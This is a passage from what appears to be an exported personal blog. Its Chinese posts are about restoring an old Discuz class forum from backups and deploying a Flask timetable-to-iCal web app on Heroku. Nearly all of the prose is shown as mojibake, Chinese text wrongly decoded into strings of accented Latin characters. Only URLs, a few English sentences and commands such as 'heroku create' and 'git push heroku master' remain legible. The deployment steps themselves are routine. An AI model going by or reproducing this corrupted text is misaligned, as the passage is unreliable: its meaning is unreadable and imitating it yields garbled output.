æŸ¥äº†ä¸€ä¸‹èµ„æ–™ï¼Œä¸€ä¸ªæ–¹æ¡ˆæ˜¯å°è¯•ç™»å½•UC_Centerï¼Œå¦‚æœæˆåŠŸç™»å½•çš„è¯å¯ä»¥åœ¨é‡Œé¢æ›´æ–°åˆ›å§‹äººçš„å¯†ç ï¼Œå†ç”¨æ›´æ–°åçš„å¯†ç ç™»å½•Discuzçš„ç®¡ç†åå°å°±è¡Œäº†ã€‚ï¼ˆè¿™é‡Œç”¨çš„å°±æ˜¯è¿™ä¸ªæ–¹æ¡ˆï¼‰ å¦ä¸€ä¸ªæ–¹æ¡ˆæ˜¯ä¿®æ”¹æ•°æ®åº“é‡Œé¢çš„ç”¨æˆ·ç›¸å…³çš„è¡¨ï¼Œå…ˆæ”¹æˆä¸€ä¸ªæ¯”è¾ƒç®€å•çš„å¯†ç ï¼ˆå¥½åƒæ˜¯MD5åŠ å¯†ï¼‰ï¼Œç™»å½•è¿›å»å†ä¿®æ”¹ã€‚è¿™é‡Œæ²¡ç”¨è¯•è¿‡å°±ä¸è¯´äº†å•¦ã€‚ é‡å»ºå®Œæˆä¹‹åè®¿é—®ä¸»é¡µã€‚ è‰ï¼ŒåŸæ¥è¿™ä¸ªæ˜¯é‚£æ—¶å€™æ›´æ–°ç‰ˆæœ¬å‰çš„æœ€åä¸€æ¬¡å¤‡ä»½emmm ï¼ˆçœ‹äºšå­æ˜¯ç¬¬å››ä»£ï¼Œæœ€åæ›´æ–°çš„æ˜¯ç¬¬äº”ä»£äº†ï¼Œçœ‹äº†åŠå¤©æ‰æƒ³èµ·æ¥ï¼‰ æ‰¾äº†ä¸€ä¸‹å‘ç°éƒ¨åˆ†é™„ä»¶å’Œå¤´åƒä¹‹ç±»çš„ä¹Ÿæœ‰å¤‡ä»½ï¼ˆæ›´å¤è€çš„æ•°æ®äº†ï¼‰ã€‚äºæ˜¯åˆæŠ˜è…¾äº†ä¸€ä¼šå„¿æŠŠèƒ½æ¢å¤çš„æ•°æ®ç»™æ¢å¤äº†ã€‚ äºæ˜¯ä¹æœ€åé‡å»ºå‡ºæ¥çš„æ˜¯2013å¹´1æœˆçš„å¤‡ä»½äº†ã€‚ æ€ä¹ˆè¯´å¥½å‘¢ï¼Œå…¶å®é—®é¢˜ä¹Ÿä¸å¤§å§ï¼ŒçœŸÂ·å›å¿†å•Šï¼ è¿™ä¸ªç‰ˆæœ¬çš„å®‰å…¨æ¼æ´æ›´å¤šäº†ï¼ŒåŒæ ·å°±ä¸å…¬å¼€äº†ï¼Œçœ‹çœ‹å°±å¥½äº†å•¦ã€‚ emmmä¸‹é¢è¿™ä¸ªæ˜¯æ¢å¤ä¸äº†çš„ç¬¬äº”ä»£ç‰ˆæœ¬ï¼ˆçœŸå°±åªæœ‰è¿™å¼ å›¾äº†å˜¤å˜¤å˜¤ï¼‰ã€‚ ä¸€äº›æƒ³æ³• Linuxæƒé™ç®¡ç†è¿˜æ˜¯å¾ˆä¸¥æ ¼çš„ï¼Œè¿™å›ä½“éªŒåˆ°äº†ï¼Œæœ‰ç©ºå†ç ”ç©¶ç ”ç©¶ã€‚ é€‰å¯¹åˆé€‚çš„ç‰ˆæœ¬ï¼Œä¸è¦æ€»æƒ³ç€ç”¨æœ€æ–°çš„ã€‚ çœ‹äº†Discuz!ç³»ç»Ÿä¹‹å‰çš„è€ç‰ˆæœ¬ï¼Œéƒ½æ˜¯æŠŠGBKç¼–ç çš„ç‰ˆæœ¬æ”¾åœ¨å‰é¢ï¼Œä¸è¿‡ç°åœ¨éƒ½æ˜¯æ¨èå®‰è£…UTF-8ç¼–ç ç‰ˆæœ¬äº†ã€‚ åŒ…æ‹¬å…¶ä»–å¾ˆå¤šåœ°æ–¹åŸºæœ¬ä¸Šå°±UTF-8äº†ï¼Œæ„Ÿè§‰ä¹Ÿç®—æ˜¯ä¸ªè¶‹åŠ¿å§ï¼Œæ¯•ç«Ÿæ˜¯å›½é™…ç¼–ç ï¼Œé€šç”¨æ€§å¼ºå˜›ã€‚ å»Discuz!å®˜æ–¹è®ºå›çœ‹äº†çœ‹ï¼Œæ„Ÿè§‰æ˜æ˜¾å†·æ¸…äº†ã€‚åŒ…æ‹¬åœ¨åå°çœ‹æ’ä»¶åº”ç”¨å¸‚åœºï¼ŒåŸºæœ¬ä¸Šå°±å˜æˆäº†å•†ä¸šåŒ–çš„äº¤æ˜“äº†ï¼Œå°±æœ‰ç‚¹æ€€å¿µNå¹´å‰é‚£æ—¶å€™ç¤¾åŒºè¿˜å¾ˆæ´»è·ƒï¼Œæœ‰ä¸€å †å…è´¹çš„è¿˜äº’ç›¸åˆ†äº«æ¥ç€ã€‚ï¼ˆä¸è¿‡ä¹Ÿç®—æ˜¯æ—¶ä»£è¶‹åŠ¿å§233 å…¶å®è¿˜æ‰¾åˆ°äº†ä»¥å‰å¯èƒ½æŠ˜è…¾è¿‡çš„å„ç§å»ºç«™ç³»ç»Ÿ233ã€‚ ç„¶åå°±æƒ³åˆ°çº¸é£æœºäº†å˜¤å˜¤å˜¤ã€‚ä»Šå¤©å»çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°çº¸é£æœºè¿˜èƒ½è®¿é—®iï¼Œåªæ˜¯è®ºå›å…³é—­äº†ï¼Œä¸ªäººç©ºé—´å’Œè§†é¢‘åŒºè¿˜æ˜¯å¼€æ”¾çš„ï¼Œè€Œä¸”ç‰ˆæœ¬æ˜¯X3.4ç®—æ˜¯æœ€æ–°çš„å¤§ç‰ˆæœ¬äº†ã€‚ï¼ˆä¸çŸ¥é“äºè€æ¿æ˜¯ä¸æ˜¯è¿˜ç»´æŠ¤è¿‡ å†™è¿™ç¯‡blogçš„æ—¶å€™åˆå»OpenShiftçœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°ç°åœ¨éƒ½å‡çº§åˆ° V4.2 ç‰ˆæœ¬äº†ã€‚å¢åŠ äº†å¾ˆå¤šç°åœ¨å¾ˆå®ç”¨å¾ˆçƒ­é—¨çš„Serverlessã€ CI/CDä¹‹ç±»çš„ï¼Œç°åœ¨çš„Starter planä¹Ÿæ˜¯å…è´¹çš„ï¼Œä¸è¿‡æ„Ÿè§‰åŠ äº†ä¸å°‘é™åˆ¶å§ï¼ˆæ¯•ç«Ÿå‡å°‘æ»¥ç”¨èŠ‚çº¦èµ„æºå˜›ï¼‰ã€‚æ„Ÿå…´è¶£çš„è¿˜å¯ä»¥çœ‹çœ‹ä¸‹é¢çš„é“¾æ¥ã€‚ ç‰ˆæœ¬ä»‹ç»ï¼šhttps://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/ äº§å“ä»‹ç»ï¼šhttps://www.openshift.com/products/online/ â€‹ å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ï¼ŒCTRL+Sä¹Ÿæ˜¯ã€‚ çœ‹äº†çœ‹ä¹‹å‰çš„å¸–å­ï¼Œå‘ç°å…¨éƒ½æ˜¯é»‘å†å²â€¦â€¦ ç„¶åæƒŠå–œåœ°å‘ç°ï¼Œä¹‹å‰çš„å¤–é“¾éš¾å¾—æœ‰å‡ ä¸ªè¿˜èƒ½è®¿é—®ï¼Œè¿›å»ä¸€çœ‹å‘ç°æ˜¯ä»¥å‰çš„æ•™è‚²åšå®¢ï¼Œå±…ç„¶ä¸€ç›´è¿è¥åˆ°äº†ç°åœ¨ï¼Œè€Œä¸”ä»¥å‰çš„æ–‡ç« éƒ½åœ¨ã€‚å…¨æ˜¯å›å¿†å•Šã€‚ã€‚ ç­‰æˆ‘æœ‰ç©ºå†æŠŠä¸Šé¢ä»¥å‰å‘çš„æ–‡ç« çˆ¬ä¸‹æ¥å¤‡ä»½ä¸€ä»½23333. æœ‰é—®é¢˜æ¬¢è¿æ¥äº¤æµå“ˆå“ˆå“ˆã€‚ æºœäº†æºœäº†å–µ","path":"2020/01/09/Idea_RebuildClassWebsite/"},{"title":"NUAA_iCal_Webåœ¨çº¿ç‰ˆæœ¬éƒ¨ç½²","text":"ä¸»è¦æ˜¯ç®€å•è®°å½•ä¸€ä¸‹Herokuçš„éƒ¨ç½²ï¼Œæ¯•ç«Ÿä¸€ä¸å°å¿ƒå°±å¿˜è®°è¯¥æ€ä¹ˆæŠ˜è…¾çš„äº†â€¦ ï¼ˆå…¶å®åº”è¯¥ä¸¤å‘¨å‰å†™è¿™ç¯‡blogçš„ï¼Œç°åœ¨å·²ç»å¿˜äº†å¾ˆå¤šäº†å˜¤å˜¤å˜¤ Causeä¹‹å‰æŠ˜è…¾äº†ä¸€ä¸¤ä¸ªæœˆï¼Œåšäº†ä¸ªæŠŠè¯¾è¡¨å¯¼å‡ºåˆ°icalæ—¥å†æ–‡ä»¶çš„å°jioæœ¬ï¼Œå³ NUAA_ClassScheduleGitHubé“¾æ¥ï¼šclick herehttps://github.com/miaotony/NUAA_ClassSchedule å…¶ä¸­æœ‰ä¸€ä¸ªTODOæ˜¯æ­å»ºä¸€ä¸ªwebç«¯ï¼Œå®ç°åœ¨çº¿å¯¼å‡ºã€‚ å®é™…ä¸Šï¼Œåœ¨æ•™åŠ¡ç³»ç»ŸåŠ å…¥éªŒè¯ç ä¹‹å‰ï¼Œå·²ç»å’Œå¥¶å†°ä¸€èµ·åšäº†ä¸€ä¸ªå¯ä»¥ç”¨çš„webç«¯äº†ï¼Œåªä¸è¿‡åªæ˜¯ç®€å•æµ‹è¯•è¿˜æ²¡å…¬å¼€å•¥çš„ã€‚ ç„¶è€Œï¼Œè¿™ä¸ªéªŒè¯ç ä¸€åŠ å°±éº»çƒ¦äº†â€¦â€¦ä¹‹å‰åšçš„ç™»å½•æ˜¾ç„¶å°±ä¸æˆåŠŸäº†ã€‚ è§£å†³æ–¹æ¡ˆçš„è¯ï¼Œåœ¨æœ¬åœ°ï¼Œæ˜¯é€šè¿‡æŠŠéªŒè¯ç ä¸‹è½½ä¸‹æ¥ï¼ŒPILè°ƒç”¨æœ¬åœ°å›¾ç‰‡æŸ¥çœ‹å™¨æ¥æ˜¾ç¤ºï¼Œè¿›è€Œåœ¨å‘½ä»¤è¡Œé‡Œè¾“å…¥ã€‚ ä¸è¿‡webç«¯å°±æœ‰ç‚¹éº»çƒ¦äº†ã€‚ ä½†æ€ä¹ˆè¯´å¥½å‘¢ï¼Œä¸å¦¨ç¢ç”¨åŒæ ·çš„æ€è·¯è§£å†³è¿™ä¸€é—®é¢˜å‘¢å˜»å˜»å˜»ã€‚åé¢å†è¯´ã€‚ å…¶å®åˆ°å†™è¿™ç¯‡blogä¸ºæ­¢è¿˜æ²¡å¼„æ¸…æ¥šä»–éªŒè¯ç çš„å…·ä½“æœºç†ã€‚ï¼ˆç­‰æˆ‘è€ƒå®Œè¯•æœ‰ç©ºå†æŠ˜è…¾å¥½äº†å–µ ä¸æƒ³å¾€ä¸‹çœ‹åˆæƒ³ä½“éªŒNUAA_iCal_Webåœ¨çº¿ç‰ˆæœ¬çš„ï¼Œç‚¹è¿™é‡Œè®¿é—®å§ã€‚ DeployHerokuç®€ä»‹å¶å°”æœ‰ä¸€å¤©åœ¨è½¬GitHubçš„æ—¶å€™ï¼Œçœ‹åˆ°æŸä¸ªé¡¹ç›®ä¸‹æœ‰ä¸ªç½‘é¡µç«¯çš„ç•Œé¢ï¼ŒREADMEé‡Œé¢ä¹Ÿæœ‰ä¸ªdeploy with herokuä¹‹ç±»çš„å›¾æ ‡æŒ‰é’®ã€‚ç‚¹è¿›å»çœ‹äº†çœ‹ï¼Œç„¶åå†æŸ¥äº†æŸ¥èµ„æ–™ã€‚ Heroku is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud. Herokuæ˜¯ä¸€ä¸ªæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€çš„äº‘å¹³å°å³æœåŠ¡ã€‚åœ¨2010å¹´è¢«Salesforce.comæ”¶è´­ã€‚Herokuä½œä¸ºæœ€å¼€å§‹çš„äº‘å¹³å°ä¹‹ä¸€ï¼Œä»2007å¹´6æœˆèµ·å¼€å‘ï¼Œå½“æ—¶å®ƒä»…æ”¯æŒRubyï¼Œä½†åæ¥å¢åŠ äº†å¯¹Javaã€Node.jsã€Scalaã€Clojureã€Pythonä»¥åŠï¼ˆæœªè®°å½•åœ¨æ­£å¼æ–‡ä»¶ä¸Šï¼‰PHPå’ŒPerlçš„æ”¯æŒã€‚åŸºç¡€æ“ä½œç³»ç»Ÿæ˜¯Debianï¼Œåœ¨æœ€æ–°çš„å †æ ˆåˆ™æ˜¯åŸºäºDebiançš„Ubuntuã€‚ å¥½ä¸œè¥¿å‘€ï¼ å‘ç°herokuå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šå…è´¹æ­å»ºç½‘ç«™ï¼Œå½“ç„¶å‰ææ˜¯è¦æœ‰ä¸€ä¸ªwsgiæ¥å£ä¹‹ç±»çš„ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯è¯´éœ€è¦è®©ä½ çš„ä¸œè¥¿èƒ½é€šè¿‡ç½‘ç»œè®¿é—®å¾—åˆ°ã€‚ å…¶å®é‚£æ—¶å€™æˆ‘è¿wsgiæ˜¯å•¥éƒ½ä¸çŸ¥é“â€¦â€¦ å®˜ç½‘é“¾æ¥ï¼šhttps://www.heroku.com/ å…·ä½“çš„å®šä»·ç­–ç•¥å‚è§è¿™é‡Œã€‚ Freeç‰ˆæœ¬çš„è¯ï¼Œæœªè®¤è¯ç”¨æˆ·æ¯ä¸ªæœˆ550å°æ—¶å…è´¹åŠ¨æ€æ—¶é•¿ï¼Œè®¤è¯ç”¨æˆ·ï¼ˆå¥½åƒæ˜¯ç»‘å®šé“¶è¡Œå¡ï¼‰1000å°æ—¶ï¼›30åˆ†é’Ÿæ— è®¿é—®æ— æ´»åŠ¨çš„è¯ä¼šè‡ªå·±ç¡å¤§è§‰ï¼Œä¸ä¼šå ç”¨ä½ çš„å®è´µæ—¶é•¿ï¼›æä¾›äºŒçº§åŸŸåï¼Œè¿˜å¯ä»¥è‡ªå·±ç»‘ç±³ã€‚ å¯¹äºnuaaicalæ¥è¯´ï¼Œè¿™ä¸ªå®Œå…¨å¤Ÿç”¨äº†å‘¢ï¼ é‚£å°±å¹²è„†æŠ˜è…¾ä¸€ä¸‹å¥½äº†ã€‚ NUAA iCal Webç«¯æ­å»ºéœ€è¦ä¸€ä¸ªwsgiæ¥å£ä¹‹ç±»çš„å˜›ï¼Œflaskã€djangoè¿™äº›ç°æˆçš„å°±è¡Œã€‚ æœ¬æ¥å°±å•¥ä¹Ÿä¸çŸ¥é“ä¹Ÿæ²¡ç©è¿‡ï¼Œçœ‹æ¥ä¸€ä¸‹flaskæŒºç®€å•çš„ï¼Œäºæ˜¯å°±ç®€å•å­¦äº†ä¸€ä¸‹flaskæ¡†æ¶ã€‚ ç„¶è€ŒçœŸæ­£æ­å»ºçš„è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€å †å¥‡å¦™çš„bugï¼Œæœ¬åœ°è·‘ç€å¥½å¥½çš„ï¼Œä¸Šäº†herokuå°±ç‚¸äº†ã€‚ï¼ˆè¿™ä¸ªä¸ç»†è¯´äº† å®é™…ä¸Šä»£ç å°±æ˜¯ä»æœ¬åœ°ç‰ˆæœ¬æ”¹çš„ï¼Œæ¯•ç«Ÿåœ¨å¼€å‘çš„æ—¶å€™ç•™äº†å¾ˆå¤šç°æˆçš„æ¥å£äº†ï¼Œæ”¹ä¸€æ”¹è°ƒç”¨ä¸€ä¸‹å‡½æ•°ä¹‹ç±»çš„å°±å®Œäº‹äº†ã€‚ ä¸è¿‡è¿™ä¸ªéªŒè¯ç æŠ˜è…¾äº†è€åŠå¤©ã€‚ è¿™é‡Œçš„ç­–ç•¥æ˜¯ï¼Œå½“ä½ è®¿é—®é¡µé¢çš„åŒæ—¶ï¼Œåç«¯å»è®¿é—®æ•™åŠ¡ç³»ç»Ÿï¼ŒæŠŠéªŒè¯ç å›¾ç‰‡çˆ¬ä¸‹æ¥é€ç»™å‰ç«¯ï¼ŒåŒæ—¶å»ºç«‹äº†ä¸€ä¸ªä¸ä½ æœ‰å…³çš„sessionã€‚ å½“ä½ postç”¨æˆ·åå¯†ç åŠéªŒè¯ç åï¼Œåç«¯åˆ©ç”¨åŒä¸€ä¸ªsessionå»è®¿é—®æ•™åŠ¡ç³»ç»Ÿï¼Œè¿›è€Œçˆ¬å–è¯¾è¡¨åŠè€ƒè¯•ä¿¡æ¯ï¼Œç”Ÿæˆicalendaræ—¥å†æ–‡ä»¶ï¼Œè€Œåä»¥é™„ä»¶ä¸‹è½½çš„å½¢å¼æ„é€ responseï¼Œä»è€Œå¾—åˆ°å±äºä½ çš„icalè¯¾è¡¨ã€‚ å½“ç„¶ï¼Œä¸€å®šç¨‹åº¦ä¸Šå®‰å…¨ä¸€ç‚¹ï¼Œè¿™ä¸ªsessionåœ¨æ„é€ å®Œresponseä¹‹åå°±é”€æ¯äº†ï¼Œä¸ä¿ç•™åœ¨äº‘å¹³å°ä¸Šã€‚ ï¼ˆè¿™æ ·å…¶å®è¿˜æ˜¯æ²¡ææ¸…æ¥šéªŒè¯ç çš„æœºç†ï¼Œä¸€å®šç¨‹åº¦ä¸Šç›¸å½“äºç»•è¿‡äº†è€Œå·²ã€‚ å…¶å®åˆ°è¿™çš„è¯ï¼Œæœ¬åœ°æ­å»ºå°±ç»“æŸäº†ã€‚ ä¸è¿‡è¿˜è€ƒè™‘äº†ä¸€ä¸‹å¤æ‚çš„ç”Ÿäº§ç¯å¢ƒâ€¦â€¦ æ¯”å¦‚è¯´ç™»å½•ä¿¡æ¯é‡å¤postï¼Œè€ŒåŸæ¥çš„éªŒè¯ç å°±ä¸å†æœ‰æ•ˆäº†ã€‚ è¿™é‡Œå…¶å®æƒ³äº†å‡ ç§æ–¹æ¡ˆï¼Œä½†æ˜¯è¡Œä¸é€šã€‚æœ€åå¹²è„†æŠ˜è…¾äº†ä¸€æ³¢HTMLï¼ŒåŠ äº†ä¸ªå‰ç«¯ç•Œé¢ï¼Œå¦‚æœæ²¡ç™»é™†æˆåŠŸå°±æç¤ºä¸€ä¸‹ï¼Œç„¶åè¿‡ä¸€ä¼šå„¿è¿”å›ä¸»é¡µå¥½äº†ã€‚233 ï¼ˆæœ‰æ›´å¥½çš„æ–¹æ¡ˆæ¬¢è¿æå‡ºå–µï¼ æ¯”å¦‚æœªç™»å½•æƒ…å†µä¸‹ç›´æ¥è®¿é—®å¯¼å‡ºicalçš„é¡µé¢ è¿™ä¸ªä¹Ÿæ˜¯ç›´æ¥è¿”å›ä¸»é¡µäº†ã€‚ä¸è¿‡è¿™é‡Œè¿™ä¸ªåˆ¤æ–­æŠ˜è…¾äº†è€åŠå¤©ã€‚ æœ€åçš„æ–¹æ¡ˆæ˜¯åœ¨flaskçš„sessioné‡Œå»ºç«‹äº†ä¸€ä¸ªå±äºå½“å‰sessionçš„boolå˜é‡ï¼Œé»˜è®¤ä¸ºFalseï¼Œç™»å½•ä»¥åè®¾ç½®ä¸ºTrueã€‚ ä¹‹å‰ç›´æ¥å†™åœ¨ç¨‹åºçš„å…¨å±€å˜é‡é‡Œï¼Œæœ¬åœ°è·‘ç€å¥½å¥½çš„ï¼Œä¸Šäº‘å¹³å°å°±ç‚¸äº†â€¦â€¦å†è§ã€‚ è¿˜å†™è¿‡åœ¨flaskçš„gå˜é‡é‡Œï¼Œåæ¥ä»”ç»†æŸ¥äº†èµ„æ–™ï¼Œgå˜é‡å¥½åƒæ˜¯åªåœ¨å½“å‰é¡µé¢è¯·æ±‚ä¸­æœ‰æ•ˆï¼Œæ„æ€å°±æ˜¯ä½œç”¨èŒƒå›´ä¸ä¸€æ ·ï¼Œäºæ˜¯å¦å†³äº†ã€‚ æ•™åŠ¡ç³»ç»Ÿè¿æ¥å·²é‡ç½® è¿™ä¸ªæ˜¯ä»–æ•™åŠ¡ç³»ç»Ÿçš„é—®é¢˜å•Šï¼Œéš¾é¡¶äº†ã€‚è¿˜æ˜¯æŠ˜è…¾äº†è€åŠå¤©æ‰å‘ç°è¿™é‡Œçš„é—®é¢˜ã€‚ åˆæ”¹äº†æ”¹ç™»å½•çš„å»¶æ—¶ï¼Œè¿™å›å˜æˆéšæœºå»¶æ—¶äº†ï¼Œè€Œä¸”æ—¶é—´ä¹ŸåŠ é•¿äº†ã€‚ è€Œä¸”è¿˜æŠŠçˆ¬è™«çš„UAæ”¹æˆäº†å½“å‰æµè§ˆå™¨çš„UAã€‚IPçš„è¯å¥½åƒæ²¡åŠæ³•äº†ã€‚ é—®é¢˜æœ‰æ‰€æ”¹å–„â€¦ç„¶è€Œå¶å°”è¿˜å­˜åœ¨ã€‚ å¤§ä¸äº†å¤šè¯•å‡ æ¬¡å°±å¥½äº†ã€‚ etc. å…¶å®è¿˜æœ‰ä¸ªæ‰“ç®—æ˜¯åšä¸ªå‰ç«¯iframæ¡†æ¶ä¹‹ç±»çš„ç›´æ¥åµŒå¥—å®˜æ–¹çš„ç™»å½•ç•Œé¢ï¼Œç„¶åç™»å½•æˆåŠŸåå†åˆ©ç”¨ç™»å½•ä¿¡æ¯æ¥çˆ¬å–è¯¾è¡¨ï¼Œè¿™æ ·ä¸€å®šç¨‹åº¦ä¸Šå¯èƒ½è¿˜æ›´å®‰å…¨ä¸€ç‚¹ã€‚å†è¯´å§â€¦â€¦ Herokuæ­å»ºä¸‹é¢æ¥ç®€å•è®°å½•ä¸€ä¸‹Herokuçš„éƒ¨ç½²ã€‚ æ³¨å†Œä¸€ä¸ªè´¦å· ç½‘å€https://www.heroku.com/ ç•¥ã€‚å»ºè®®ç”¨gmailï¼Œä¸è¿‡ä¹Ÿçœ‹åˆ°ç”¨å›½å†…é‚®ç®±ä¹ŸæˆåŠŸçš„ã€‚ å®‰è£…Heroku CLI å‘½ä»¤è¡Œæ¥å£ Win-x64ï¼šä¸‹è½½åœ°å€ å…¶ä»–ç¯å¢ƒçš„è§å®˜ç½‘å¥½äº†ã€‚https://devcenter.heroku.com/articles/heroku-cli å®‰è£…å®Œä¹‹åå°±å¯ä»¥åœ¨å‘½ä»¤è¡Œç”¨herokuå‘½ä»¤äº†ã€‚ ç™»å½• heroku login ä¼šå¼¹å‡ºç½‘é¡µç™»å½•éªŒè¯ï¼Œæˆ–è€…åœ¨å‘½ä»¤è¡Œç™»å½•ã€‚ å‡†å¤‡å¥½app ä½ çœ‹ä»–æ”¯æŒçš„è¯­è¨€æŒºå¤šçš„å‘¢ã€‚ æˆ‘è¿™é‡Œç”¨åˆ°çš„å°±æ˜¯pythonå•¦ã€‚ è¿™ä¸ªåœ¨ä¸Šä¸€èŠ‚å·²ç»æ­å»ºå¥½äº†å–µã€‚ åˆ›å»ºapp heroku create è¿™æ—¶å€™åŒæ—¶å»ºç«‹äº†ä¸€ä¸ªåä¸ºherokuçš„git remoteä»“åº“ï¼Œè¿æ¥åˆ°äº†ä½ æœ¬åœ°çš„gitä»“åº“ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥ç°åœ¨ç½‘ç«™ä¸Šåˆ›å»ºä¸€ä¸ªåº”ç”¨ï¼Œå†clone heroku git:clone -a nuaaical cd nuaaical è¿™é‡Œå‰ææ˜¯å»ºç«‹å¥½äº†åä¸ºnuaaicalçš„åº”ç”¨äº†ã€‚ å»ºç«‹ä¾èµ–ç›¸å…³çš„requirements.txt ç•¥ã€‚ æŒ‡å®šæ‰§è¡Œçš„å…¥å£ è¿™é‡Œç®—æ˜¯ä¸€ä¸ªå‘å§ï¼ŒæŠ˜è…¾äº†å¥½ä¹…æ‰å‘ç°ã€‚ ä½ å¿…é¡»å…ˆåœ¨ä»£ç ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªåä¸ºProcfileçš„æ–‡ä»¶ï¼Œåœ¨é‡Œé¢å†™ä¸Šä½ è¦ä»–æ‰§è¡Œçš„å‘½ä»¤ã€‚æ¯”å¦‚æ‰§è¡Œä¸€ä¸ªpythonæ–‡ä»¶ä¹‹ç±»çš„ã€‚ åœ¨è¿™é‡Œç”¨çš„æ˜¯gunicornæ¥å»ºç«‹ä¸€ä¸ªwebåº”ç”¨ã€‚ï¼ˆflaskåªç”¨äºæœ¬åœ°æµ‹è¯•ä½¿ç”¨ web: gunicorn web:app ç¬¬äºŒä¸ªwebæ˜¯æ–‡ä»¶åï¼ˆweb.pyï¼‰ï¼Œappæ˜¯flaskå®ä¾‹åŒ–çš„å¯¹è±¡å•¦ã€‚ï¼ˆä»£ç é‡Œå†™çš„app = Flask(__name__) æŒ‡å®šç”¨æ„å»ºè¯­è¨€ï¼ˆå¯ç•¥ï¼Ÿï¼‰ heroku buildpacks:set heroku/python æ˜¾ç¤ºæŒ‡å®šç”¨pythonæ¥æ„å»ºæ‰“åŒ…ï¼ˆç½‘ä¸Šæœ‰çš„è¯´ä¸æŒ‡å®šä¼šæŠ¥é”™ï¼Ÿ éƒ¨ç½²ä»£ç  ç»ˆäºå¯ä»¥éƒ¨ç½²äº†å‘€ï¼ç›´æ¥pushå¥½äº†ã€‚ git push heroku master å¦‚æœä¸è¡Œçš„è¯åŠ ä¸Š-få¼ºåˆ¶pushï¼ˆå°å¿ƒä¸€ç‚¹ï¼‰ã€‚ ç„¶åå¯ä»¥çœ‹åˆ°éƒ¨ç½²çš„æ—¥å¿—ï¼Œå¦‚æœæœ‰é—®é¢˜å°±å†çœ‹çœ‹ã€‚ æ²¡é—®é¢˜çš„è¯ï¼Œæ•ˆæœç±»ä¼¼ä¸‹é¢çš„ã€‚ çœ‹çœ‹ä½ çš„ç½‘ç«™å§ heroku open ç„¶åä¼šè°ƒç”¨ä½ çš„æµè§ˆå™¨æ‰“å¼€ã€‚ æˆ–è€…è‡ªå·±åœ¨æµè§ˆå™¨è®¿é—®å°±å¥½äº†ã€‚ å˜»å˜»å˜»ï¼Œåˆ°è¿™å°±ç»“æŸå•¦~ æ‹“å±•å½“ç„¶è¿˜æœ‰ä¸€äº›å¸¸ç”¨å‘½ä»¤ï¼Œæ¯”å¦‚ï¼š æŸ¥çœ‹æ—¥å¿—**(debugå¿…å¤‡äº†)** heroku logs --tail çœ‹ä¸€ä¸‹è¿˜æœ‰å¤šå°‘å‰©ä½™æ—¶é•¿ heroku ps æ‰“å¼€appæœåŠ¡ heroku ps:scale web=1 å…³é—­appæœåŠ¡ heroku ps:scale web=0 etc. å®˜æ–¹æ–‡æ¡£Getting Started on Herokuçœ‹è¿™é‡Œ https://devcenter.heroku.com/start é™¤æ­¤ä»¥å¤–ï¼ŒHerokuè¿˜æ”¯æŒpipelineï¼Œè¿˜å¯ä»¥æˆæƒä»GitHubä¸ŠåŒæ­¥éƒ¨ç½²ï¼Œè¿˜æœ‰å®¹å™¨å•¥çš„â€¦â€¦ æ„Ÿè§‰è¿˜æ˜¯æŒºä¸é”™çš„å‘¢ï¼ Achievementséƒ¨ç½²å¥½çš„webç«¯ç½‘å€ï¼š https://nuaaical.herokuapp.com/ æ¬¢è¿æ¥è¯•è¯•å‘€ï¼ ç¬¬ä¸€æ¬¡è®¿é—®å¯èƒ½ä¼šèŠ±ä¸€äº›æ—¶é—´ï¼Œç­‰ä¸€ç­‰å§ã€‚ å¦‚æœä¸æˆåŠŸçš„è¯åˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼ˆä½†ä¸è¦é‡å¤æäº¤ç™»å½•ä¿¡æ¯ï¼‰ï¼Œæˆ–é‡æ–°å¼€ä¸€ä¸ªé¡µé¢è®¿é—®ã€‚ åŒæ—¶å¤šäººè®¿é—®çš„è¯ä¹Ÿå¯èƒ½ä¼šæœ‰é—®é¢˜ï¼ˆæ²¡è¯•è¿‡ï¼‰ï¼Œé‚£å°±å†è¯•è¯•å§ã€‚ï¼ˆæ‘Šæ‰‹ å¥½äº†æˆ‘çŸ¥é“è¿™ä¸ªé¡µé¢ä¸‘äº†ã€‚ç°å­¦çš„HTMLï¼Œåˆ«è¯´äº†ã€‚ å…¶å®ä¹‹å‰å¥¶å†°å¥¶å†°å¥¶å†°å†°åšäº†ä¸€ä¸ªå‰ç«¯çš„â†“ åé¢å†æŠ˜è…¾å§å’•å’•å’• æ¬¢è¿æ¥è´¡çŒ®ä»£ç å‘€ï¼ å…¶å®ä¹‹å‰è¿˜æŠ˜è…¾äº†è€åŠå¤©ï¼Œå°è¯•äº†åœ¨Azureä¸Šéƒ¨ç½²ï¼Œä¹ŸæˆåŠŸäº†ã€‚ éœ€è¦åœ¨VSCodeä¸­è¿›è¡Œéƒ¨ç½²ï¼Œç„¶ååœ¨é…ç½®é‡Œè®¾å¥½å¯åŠ¨å‘½ä»¤ï¼ˆä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼‰ã€‚ ä¸è¿‡ç°åœ¨AzureæœåŠ¡åˆ°æœŸäº†ã€‚éƒ¨ç½²çš„ç½‘ç«™ä¹Ÿåœæ­¢äº†å‘¢ã€‚ æˆªä¸ªå›¾çºªå¿µä¸€ä¸‹å§ã€‚ ï¼ˆhackathonçš„æ—¶å€™ç™½å«–çš„Azureè¿˜æ˜¯æŒºçˆ½çš„233 åŒæ—¶ï¼Œä»£ç å¼€æºåœ¨GitHubä¸Šäº†ã€‚æ¬¢è¿æ¥ç‚¹ä¸ªstarï¼Œæä¸ªPRå–µï¼ https://github.com/miaotony/NUAA_iCal_Web ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œæœªç»å…è®¸ç¦æ­¢å•†ç”¨ï¼Œè°¢è°¢ã€‚ æ–‡ç« ä¸­ä¸å…å­˜åœ¨é—®é¢˜ï¼Œæ¬¢è¿æå‡ºã€‚ Reference https://devcenter.heroku.com/ https://www.jianshu.com/p/191248ad2639 